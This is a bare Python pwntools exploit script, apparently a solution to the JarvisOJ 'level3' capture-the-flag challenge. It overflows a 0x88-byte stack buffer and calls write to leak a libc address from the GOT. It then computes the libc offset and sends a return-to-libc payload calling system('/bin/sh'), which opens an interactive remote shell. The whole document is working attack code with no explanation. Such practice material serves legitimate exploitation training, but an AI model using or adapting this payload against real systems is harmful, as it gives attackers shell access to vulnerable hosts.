from pwn import *

p = remote('pwn2.jarvisoj.com',9879)

payload = ''

libc = ELF('./libc-2.19.so')

f = ELF('./level3')

payload += (0x88+4)*'a' + p32(f.symbols['write']) + p32(f.symbols['vulnerable_function']) +p32(1)+ p32(f.got['write']) +p32(4)

p.recv()

p.sendline(payload)

write = p.recv(4)

offset = u32(write) - libc.symbols['write']

sys = p32(libc.symbols['system']+offset)

binsh = p32(libc.search('/bin/sh').next()+offset)

pay = (0x88+4) * 'a' + sys + p32(0xdeadbeef) + binsh

p.sendline(pay)

p.interactive()
